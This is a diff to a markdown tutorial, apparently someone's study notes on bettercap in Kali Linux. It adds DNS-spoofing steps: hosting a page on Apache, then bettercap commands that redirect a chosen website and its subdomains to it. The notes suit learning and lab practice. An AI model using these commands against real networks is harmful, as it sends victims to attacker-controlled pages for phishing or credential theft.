@@ -125,9 +125,29 @@ net.sniff
 <img width="347" alt="image" src="https://github.com/user-attachments/assets/a50fee49-aa13-40fa-8a11-a6f4512edfe6" />
 - We ls to the .cap file we made
 - Then we write the command
+  
 ```bash
 bettercap -iface wlan0 -caplet FILENAME.cap
 ```
+
+### Steps for DNS Spoofing
+
+- We create a new server called Apache2 from Kali, we will use that server as a website that we will redirect target to our website
+
+```bash service apache2 start 
+```
+- We can use ifconfig to find our IP address and put it in a browser and we can see the default page of Apache
+- We can find the index.html page in the path /var/www/html
+<img width="527" alt="image" src="https://github.com/user-attachments/assets/94fb2fae-a661-41c2-aa1c-e50f016bd188" />
+- We can edit the html pages and replace it with whatever we want
+- We start the bettercap with the spoof.cap caplet
+- We will use **dns.spoof** and activate **dns.spoof.all** and dns.spoof.domains and start the DNS spoof
+```bash
+set dns.spoof.all true
+set dns.spoof.domains <the website>, *.<All the subdomains of the website>
+dns.spoof on
+```
+
 
 
 
